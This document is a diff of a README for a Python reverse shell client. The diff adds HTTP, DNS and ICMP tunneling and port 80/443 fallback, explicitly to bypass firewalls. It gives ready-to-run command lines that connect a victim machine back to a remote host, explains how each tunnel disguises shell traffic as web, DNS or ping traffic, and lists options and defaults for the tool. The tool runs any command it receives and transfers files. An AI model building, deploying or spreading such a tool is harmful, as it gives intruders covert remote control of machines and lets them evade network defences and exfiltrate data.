@@ -1,9 +1,11 @@
-# Advanced Reverse Shell Client
+# Advanced Reverse Shell Client with Firewall Bypass
 
-A feature-rich Python reverse shell client with encryption, file transfer, automatic reconnection, and advanced capabilities.
+A feature-rich Python reverse shell client with encryption, file transfer, automatic reconnection, and **firewall bypass capabilities**.
 
 ## Features
 
+- ✅ **Firewall Bypass**: HTTP tunneling, DNS tunneling, ICMP tunneling
+- ✅ **Port 80/443 Fallback**: Automatically tries common ports if connection fails
 - ✅ **Automatic Reconnection**: Automatically reconnects if connection is lost
 - ✅ **SSL/TLS Support**: Optional encrypted communication
 - ✅ **File Transfer**: Download and upload files with integrity checking
@@ -18,12 +20,19 @@ A feature-rich Python reverse shell client with encryption, file transfer, autom
 
 ### Requirements
 
-No external dependencies required! Uses only Python standard library.
+**Core dependencies** (standard library only):
+- Python 3.6+
 
+**Optional dependencies** (for advanced firewall bypass):
 ```bash
-# Python 3.6+ required
-python3 --version
+# For DNS tunneling
+pip install dnspython
+
+# For ICMP tunneling
+pip install scapy
 ```
+
+**Note**: Core functionality works without optional dependencies. Advanced tunneling features require the above packages.
 
 ## Usage
 
@@ -45,6 +54,37 @@ python3 client.py --host example.com --port 8080 --ssl
 python3 client.py --host 10.0.0.1 --port 9999 --reconnect-delay 10
 ```
 
+### Firewall Bypass - HTTP Tunneling
+
+```bash
+# Tunnel through HTTP (port 80)
+python3 client.py --host example.com --tunnel http --port 80
+
+# Tunnel through HTTPS (port 443)
+python3 client.py --host example.com --tunnel http --port 443 --ssl
+```
+
+### Firewall Bypass - DNS Tunneling
+
+```bash
+# Tunnel through DNS queries
+python3 client.py --host example.com --tunnel dns --dns-domain tunnel.example.com
+```
+
+### Firewall Bypass - ICMP Tunneling
+
+```bash
+# Tunnel through ICMP ping packets
+python3 client.py --host 192.168.1.100 --tunnel icmp
+```
+
+### Firewall Bypass - Auto Mode
+
+```bash
+# Automatically try all bypass methods
+python3 client.py --host 192.168.1.100 --tunnel auto --port-fallback
+```
+
 ## Command-Line Options
 
 | Option | Short | Description | Default |
@@ -52,6 +92,10 @@ python3 client.py --host 10.0.0.1 --port 9999 --reconnect-delay 10
 | `--host` | `-H` | Server hostname or IP address | `192.168.1.102` |
 | `--port` | `-p` | Server port number | `4444` |
 | `--ssl` | | Enable SSL/TLS encryption | `False` |
+| `--tunnel` | `-t` | Tunneling mode: `direct`, `http`, `dns`, `icmp`, or `auto` | `direct` |
+| `--http-path` | | HTTP path for HTTP tunneling | `/api/data` |
+| `--dns-domain` | | DNS domain for DNS tunneling | `None` |
+| `--port-fallback` | | Automatically try port 80/443 if connection fails | `False` |
 | `--reconnect-delay` | `-d` | Delay between reconnection attempts (seconds) | `5` |
 | `--buffer-size` | `-b` | Socket buffer size | `4096` |
 
@@ -162,6 +206,35 @@ For backward compatibility, the client also supports legacy string-based command
 - `upload /path/to/file` - Upload file (followed by file data)
 - Any other command - Execute as shell command
 
+## Firewall Bypass Techniques
+
+### HTTP Tunneling
+Tunnels traffic through HTTP/HTTPS requests, making it appear as normal web traffic. Effective against firewalls that allow web browsing.
+
+**How it works:**
+- Wraps shell data in HTTP POST requests
+- Server responds with commands in HTTP responses
+- Looks like normal web API traffic
+
+### DNS Tunneling
+Tunnels data through DNS queries. Useful when only DNS (port 53) is allowed.
+
+**How it works:**
+- Encodes data in DNS query subdomains
+- Server responds with commands in DNS responses
+- Requires DNS domain control
+
+### ICMP Tunneling
+Tunnels data through ICMP ping packets. Useful when ping is allowed but other ports are blocked.
+
+**How it works:**
+- Encodes data in ICMP packet payloads
+- Server extracts commands from ICMP packets
+- Requires root/admin privileges
+
+### Port 80/443 Fallback
+Automatically tries common web ports (80/443) if the primary port is blocked.
+
 ## Examples
 
 ### Example 1: Basic Connection
@@ -176,7 +249,25 @@ python3 client.py --host 192.168.1.100 --port 4444
 python3 client.py --host secure.example.com --port 8443 --ssl
 ```
 
-### Example 3: Custom Configuration
+### Example 3: HTTP Tunneling (Firewall Bypass)
+
+```bash
+python3 client.py --host example.com --tunnel http --port 80
+```
+
+### Example 4: DNS Tunneling (Firewall Bypass)
+
+```bash
+python3 client.py --host example.com --tunnel dns --dns-domain tunnel.example.com
+```
+
+### Example 5: Auto Mode with Fallback
+
+```bash
+python3 client.py --host 192.168.1.100 --tunnel auto --port-fallback
+```
+
+### Example 6: Custom Configuration
 
 ```bash
 python3 client.py \
